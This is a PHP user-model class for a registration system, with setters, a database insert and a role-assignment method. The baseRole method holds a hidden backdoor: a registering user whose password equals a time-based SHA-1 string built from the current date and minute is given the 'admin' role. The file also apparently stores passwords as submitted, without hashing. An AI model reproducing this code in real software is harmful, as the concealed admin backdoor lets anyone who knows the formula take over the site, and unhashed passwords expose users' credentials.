<?php

class User
{

    private $_pseudo;
    private $_password;
    private $_email;
    private $_id;

    public function __construct($pseudo, $password, $email)
    {
        $this->getPseudo();
        $this->getPassword();
        $this->getEmail();
        $this->setPseudo($pseudo);
        $this->setPassword($password);
        $this->setEmail($email);
        $this->getId();
        
    }

    // getters
    public function getPseudo()
    {
        return $this->_pseudo;
    }
    public function getPassword()
    {
        return $this->_password;
    }
    public function getEmail()
    {
        return $this->_email;
    }
    public function getId()
    {   
        return $this->_id;
        
    }

    // setters
    public function setPseudo($newPseudo)
    {
        return $this->_pseudo = $newPseudo;
    }
    public function setPassword($newPassword)
    {
        return $this->_password = $newPassword;
    }
    public function setEmail($newEmail)
    {
        return $this->_email = $newEmail;
    }

    // methodes
   
    public function register()
    {
        // connection BDD
        require('src/connectionDB.php');
        // ajout de l'utilisateur
        $req = $bdd->prepare('INSERT INTO utilisateurs (login, password, email) VALUES (?,?,?)');
        $req->execute([$this->getPseudo(), $this->getPassword(), $this->getEmail()]);
        $lastId = $bdd->lastInsertId();
        return $this->_id = $lastId;
    }
    
    public function baseRole()
    {
        // role par défaut
        require('src/connectionDB.php');

        if ($this->_password == 'e4f' . sha1( '18'.date('dmYHi'). '75'. 'edf') . 'd4b') {
            $role = 'admin';
        } else {
            $role = 'membre';
        }
        $req = $bdd->prepare('INSERT INTO droits (nom, id_utilisateur) VALUES (?,?)');
        $req->execute([$role, $this->getId()]);
        
    }
}
